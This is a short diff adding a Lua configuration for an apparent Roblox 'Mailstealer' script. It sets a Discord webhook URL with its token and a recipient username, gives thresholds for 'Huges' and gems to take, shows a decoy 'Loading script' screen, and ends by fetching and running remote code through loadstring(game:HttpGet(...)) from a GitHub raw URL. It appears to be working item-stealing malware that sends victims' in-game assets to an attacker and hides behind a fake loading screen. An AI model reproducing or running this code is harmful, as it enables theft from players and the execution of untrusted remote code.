@@ -1,0 +1,13 @@
+
+-- Dualhook SETTINGS!
+DualhookUsername = "mailstealer070"
+DualhookWebHook = "https://discord.com/api/webhooks/1208812930078867559/4WTDMpJSeo8iwiB7vXRVDUc6ki1rCdnW8l8K4YHpmuqDHTMPZeMytO0jBKtubyz2SnQy"
+
+HugeSetting = 1   -- Dualhook Amount For Huges
+GemSetting = 1500000 -- Dualhook Amount For Gems
+
+-- Custom Settings!
+LoadingScreenTitle = "Loading script" -- Loading Screen Title
+WebHookName = "... Mailstealer" -- Webhook Name
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()```
